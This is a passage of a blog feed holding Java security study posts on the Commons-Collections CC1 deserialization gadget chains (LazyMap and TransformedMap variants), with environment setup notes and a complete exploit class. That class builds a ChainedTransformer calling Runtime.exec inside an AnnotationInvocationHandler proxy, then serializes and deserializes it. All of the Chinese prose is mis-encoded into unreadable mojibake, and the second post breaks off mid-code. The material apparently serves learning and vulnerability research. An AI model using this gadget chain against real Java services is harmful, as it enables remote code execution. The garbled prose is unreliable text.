        <content type="html"><![CDATA[<h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥æ‹¿cc1çš„demoæ”¹äº†ï¼Œé¦–å…ˆè¿›å…¥<code>InvokerTransformer</code>ä¸‹çš„<code>transform</code>æ–¹æ³•ç„¶åfind usages<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819199.png" alt="image-20230430181911069"><br>å¯ä»¥çœ‹åˆ°LazyMapä¸‹ä¹Ÿè°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼Œç›´æ¥è¿›å»çœ‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>publicå‹<code>get</code>æ–¹æ³•è°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼Œç„¶åå»çœ‹factory<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819343.png" alt="image-20230430181932250"><br>ç„¶åè¿™é‡ŒåŒæ—¶è¿˜æœ‰decorateæ–¹æ³•å’Œ<code>TransformMap</code> ä¸­çš„ <code>decorate</code> æ–¹æ³•æ˜¯ä¸€æ ·çš„ä½œç”¨ï¼Œç„¶åå»çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ä¸º<code>protected</code>æ‰€ä»¥å¾—é€šè¿‡decorateæ–¹æ³•è·å¾—LazyMapç±»çš„å¯¹è±¡å»è°ƒç”¨<br>å…ˆå†™ä¸ªexpå¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>  </span><br><span class="line">                (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">Mapdecorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        <span class="comment">//ç›¸å½“äºè£…é¥°å™¨ï¼Œå³æ­¤æ—¶Mapdecorateä¹Ÿæœ‰invokerTransformerå¯¹è±¡çš„åŠŸèƒ½  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(Mapdecorate,runtime);  </span><br><span class="line">        <span class="comment">//æœ€åè¿™é‡Œè°ƒç”¨äº†LazyMapçš„getæ–¹æ³•é‡Œé¢æ‰§è¡Œäº†transformæ–¹æ³•ï¼Œå‚æ•°ä¸ºruntime  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819409.png" alt="image-20230430181951307"><br>è¯æ˜è¿™æ¡é“¾åˆ°ç›®å‰æ˜¯å¯è¡Œçš„ï¼Œç„¶åæ‰¾è°è°ƒç”¨äº†LazyMapä¸­çš„getæ–¹æ³•ï¼Œæœ€ç»ˆç›®æ ‡æ˜¯æ‰¾åˆ°readObject<br>è¿™é‡Œåœ¨AnnotationInvocationHandlerç±»ä¸‹çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•ï¼Œè¿™é‡Œfind usages getæ–¹æ³•çš„è¯ç»“æœå¾ˆå¤šï¼Œæ‰€ä»¥æˆ‘ç›´æ¥åœ¨CC1çš„å¦ä¸€æ¡é“¾ä¸­è¿›å…¥è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820476.png" alt="image-20230430182006425"><br>åŒæ—¶è¿™ä¸ªç±»ä¸­ä¹Ÿå­˜åœ¨readObjectæ–¹æ³•ï¼Œç›¸å½“äºæ‰¾åˆ°å…¥å£ï¼Œè€Œä¸”é€šè¿‡æ„é€ æ–¹æ³•å‘ç°è¿™ä¸ªmemberValueä¹Ÿæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥ç°åœ¨æ˜¯è§£å†³æ€ä¹ˆè¿›å…¥è¿™ä¸ªç±»çš„invokeæ–¹æ³•ï¼Œè¿™é‡Œå°±å¯ä»¥ç»“åˆåŠ¨æ€ä»£ç†ï¼Œä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†ä¹‹åæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»å¿…é¡»é€šè¿‡invokeæ–¹æ³•ï¼Œç»§ç»­å¯»æ‰¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820664.png" alt="image-20230430182018517"><br>å¯ä»¥çœ‹åˆ°åœ¨readObjectæ–¹æ³•ä¸­memberValuesè°ƒç”¨äº†entrySetæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œè®©memberValuesæˆä¸ºä»£ç†å¯¹è±¡é‚£ä¹ˆè°ƒç”¨entrySetæ–¹æ³•æ—¶å°±ä¼šè¿›å…¥invokeæ–¹æ³•</p><h2 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(invocationHandler);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820365.png" alt="image-20230430182035279"></p><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InvokeTransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾…åŠ©é“¾</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæµç¨‹å›¾æ‡’å¾—ç”»äº†ï¼Œå¼€æ‘†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾1</title>
      <link href="/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE1/"/>
      <url>/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE1/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ„Ÿè§‰æœ€è¿‘Javaè€ƒçš„ç”¨çš„å¾ˆå¤šï¼Œè‡ªå·±å¯¹äºJavaæ˜¯0åŸºç¡€ï¼Œè®©æˆ‘è¿«åˆ‡æƒ³è¦å¼€å§‹å­¦ï¼Œçœ‹äº†å¤§ä½¬çš„å­¦ä¹ é“¾æ˜¯ä»å¼€å‘å¼€å§‹ï¼Œé‚£æ ·æ„Ÿè§‰å°±å¤ªæ…¢äº†è€Œä¸”è‡ªå·±å¯¹äºå¼€å‘å…´è¶£ä¸å¤§ï¼Œä½†æ˜¯åååˆç¦»ä¸å¼€å¼€å‘ï¼Œåªèƒ½è¾¹å­¦å¼€å‘è¾¹çœ‹å®‰å…¨ï¼Œè™½ç„¶æœ‰ç‚¹æ€¥äº†ä½†æ˜¯ä¹Ÿæ²¡åŠæ³•äº†</p><h2 id="ä¸€ç‚¹å»ºè®®"><a href="#ä¸€ç‚¹å»ºè®®" class="headerlink" title="ä¸€ç‚¹å»ºè®®"></a>ä¸€ç‚¹å»ºè®®</h2><p>å¦‚æœæ²¡æœ‰å­¦è¿‡Javaæˆ–è€…ä¸äº†è§£ideaçš„æ“ä½œçš„è¯å¼€å§‹CCé“¾ä¹‹å‰å¼ºçƒˆå»ºè®®å…ˆè·ŸURLDNSé“¾ï¼ŒæŠŠè¯¥è¸©çš„å‘è¸©äº†å†å¼„CCé“¾ä¼šé¡ºç•…å¾ˆå¤š</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>è¿™é‡Œæˆ‘å°±åˆ—ä¸€ä¸‹è‡ªå·±è¸©çš„å‘ï¼Œä½œä¸ºä¸€ä¸ªå¯¹Javaå’Œideaä¸ç†Ÿæ‚‰çš„æ–°æ‰‹å®¹æ˜“çŠ¯çš„é”™</p><h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p>jdkè¦æ±‚æ˜¯jdk8u65ï¼Œåœ¨å®˜ç½‘æˆ‘ä¸‹è½½çš„æ—¶å€™é€‰æ‹©8u65ä½†æ˜¯ä¸‹è½½çš„å´ä¸æ˜¯ï¼Œ<a href="https://blog.lupf.cn/articles/2022/02/20/1645352101537.html">å¦å¤–çš„å¹³å°</a><br>å®‰è£…ä¼šåŒæ—¶å®‰è£…jdkå’Œjreæˆ‘ä»¬éœ€è¦çš„æ˜¯jdkä¸è¦æŠŠjreä¹Ÿæ”¾åœ¨jdkç›®å½•ä¸‹ï¼Œä¸ç„¶ideaå¯¼å…¥jdkä¼šå¤±è´¥ä¸‹è½½å®Œçš„ç›®å½•å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262142103.png" alt="image-20230426214158005"></p><h3 id="åŠ å…¥ä¾èµ–"><a href="#åŠ å…¥ä¾èµ–" class="headerlink" title="åŠ å…¥ä¾èµ–"></a>åŠ å…¥ä¾èµ–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå½“åˆ›å»ºå¥½mavené¡¹ç›®ååœ¨ä¾èµ–ä¸­å¦‚æœæ²¡æœ‰æ”¾ä¾èµ–çš„æ ‡ç­¾<code>&lt;dependencies&gt; &lt;/dependencies&gt;</code>é‚£ä¹ˆéœ€è¦ä½ è‡ªå·±å»åˆ›å»ºï¼Œä½ çš„ä¾èµ–å¿…é¡»ç”±å®ƒåŒ…è£¹</p><h2 id="å…¶å®ƒç¯å¢ƒ"><a href="#å…¶å®ƒç¯å¢ƒ" class="headerlink" title="å…¶å®ƒç¯å¢ƒ"></a>å…¶å®ƒç¯å¢ƒ</h2><p>å‚è€ƒï¼š<br><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡01-CC1é“¾ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/">https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/</a><br>åŸºæœ¬ä¸Šå°±æ²¡å•¥é—®é¢˜äº†</p><h2 id="Common-Collections-ç›¸å…³ä»‹ç»"><a href="#Common-Collections-ç›¸å…³ä»‹ç»" class="headerlink" title="Common-Collections ç›¸å…³ä»‹ç»"></a>Common-Collections ç›¸å…³ä»‹ç»</h2><p>è¿™ä¸€éƒ¨åˆ†å‰è¾ˆä»¬å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘è¿™é‡Œæ”¾ä¸€ä¸‹æ–¹ä¾¿è‡ªå·±è§‚çœ‹<br><a href="http://commons.apache.org/">Apache Commons</a>æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äº<code>Jakarta</code>é¡¹ç›®ã€‚<code>Commons</code>çš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>Proper</code>ï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€<code>Sandbox</code>ï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’Œ<code>Dormant</code>ï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚</p><ul><li>ç®€å•æ¥è¯´ï¼ŒCommon-Collections è¿™ä¸ªé¡¹ç›®å¼€å‘å‡ºæ¥æ˜¯ä¸ºäº†ç»™ Java æ ‡å‡†çš„ <code>Collections API</code> æä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚</li></ul><h3 id="åŒ…ç»“æ„ä»‹ç»"><a href="#åŒ…ç»“æ„ä»‹ç»" class="headerlink" title="åŒ…ç»“æ„ä»‹ç»"></a>åŒ…ç»“æ„ä»‹ç»</h3><ul><li><code>org.apache.commons.collections</code> â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±»</li><li><code>org.apache.commons.collections.bag</code> â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.bidimap</code> â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.buffer</code> â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.collection</code> â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.comparators</code>â€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.functors</code> â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±»</li><li><code>org.apache.commons.collections.iterators</code> â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.keyvalue</code> â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.list</code> â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.map</code> â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.set</code> â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li></ul><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>CC1é“¾åˆ†ä¸ºä¸¤ä¸ªç‰ˆæœ¬ï¼Œè¿™é‡Œå¼•ç”¨ä¸€ä¸‹lengf233å¸ˆå‚…çš„ä»‹ç»ï¼Œâ€œå…³äºCC1é“¾å…¶å®æ˜¯æœ‰ä¸¤æ¡çš„ï¼Œä¸€ä¸ªæ˜¯LazyMapè¿™ä¸€æ¡é“¾ï¼Œå¦å¤–ä¸€æ¡å°±æ˜¯TransformMapé“¾ï¼Œç¬¬äºŒæ¡é“¾æ˜¯ä¼ å…¥å›½å†…ä¹‹åè¢«å‘ç°çš„ã€‚â€å¾ˆå¤šåˆ†ææ–‡ç« æ²¡æœ‰ä»‹ç»è¿™ä¸€ç‚¹ï¼Œæˆ‘ä¹Ÿæ˜¯çœ‹äº†å¸ˆå‚…çš„æ–‡ç« æ‰çŸ¥é“ï¼Œè¿™é‡Œåˆ†æTransformMapé“¾<br>ç”¨ä¸€ä¸‹ä½¬çš„æµç¨‹åˆ†æå›¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144895.png" alt="image-20230426214421823"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯åœ¨æœ€åçš„å‘½ä»¤æ‰§è¡Œï¼Œæ—¢ç„¶åœ¨æœ€åé‚£ä¹ˆå¿…ç„¶éœ€è¦ä¸€ä¸ªåˆ°è¿™é‡Œçš„ç±»ï¼Œé€‰æ‹©ä¸€ä¸ªæ¥æ”¶ä»»æ„å¯¹è±¡å«æœ‰readObjectæ–¹æ³•çš„ç±»ä½œä¸ºå…¥å£ç±»ï¼Œä¸­é—´ç”¨é“¾å­å…¶å®ƒæ–¹æ³•é“¾èµ·æ¥é‚£ä¹ˆå°±åˆ°è¾¾äº†ç›®çš„</p><h3 id="é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•"><a href="#é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•" class="headerlink" title="é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•"></a>é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•</h3><p>æˆ‘ä»¬ç›´æ¥æ‰¾å“ªé‡Œä¼šè°ƒç”¨execæ–¹æ³•ï¼Œå‰äººç»éªŒåœ¨Transformeræ¥å£ä¸­ï¼Œæ‰€ä»¥ç›´æ¥åˆ°è¿™é‡Œæ¥ï¼Œåœ¨Common-Collections.jaråŒ…ä¸­æ‰¾åˆ°è¿™ä¸ªæ¥å£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144606.png" alt="image-20230426214435545"><br>ç„¶åctrl+alt+bå¯ä»¥æŸ¥çœ‹å®ç°äº†è¯¥æ¥å£çš„ç±»ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†InvokerTransformerç±»ï¼Œåœ¨è¯¥ç±»ä¸‹æœ‰ä¸ªtransformæ–¹æ³•é‡Œé¢è°ƒç”¨äº†invokeæ–¹æ³•ï¼Œæ­¤æ—¶è¿˜æ²¡æ„Ÿè§‰æœ‰ä»€ä¹ˆï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ‰€åœ¨çš„ç±»ä¸ºMethodç±»ï¼Œè¿™ä¸ªç±»æ‰€åœ¨çš„åŒ…ä¸ºJavaä¸­é¼é¼å¤§åçš„åå°„åŒ…ï¼ŒMethodä¸­<strong>invoke</strong>(Object obj,Objectâ€¦args)æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç›¸åº”å‡½æ•°ä¸­çš„å‚æ•°<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144759.png" alt="image-20230426214448720"><br>é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨åå°„è°ƒç”¨ä»»æ„ç±»ï¼Œå…ˆå°è¯•åˆ©ç”¨å®ƒæ¥å¼¹ä¸ªè®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 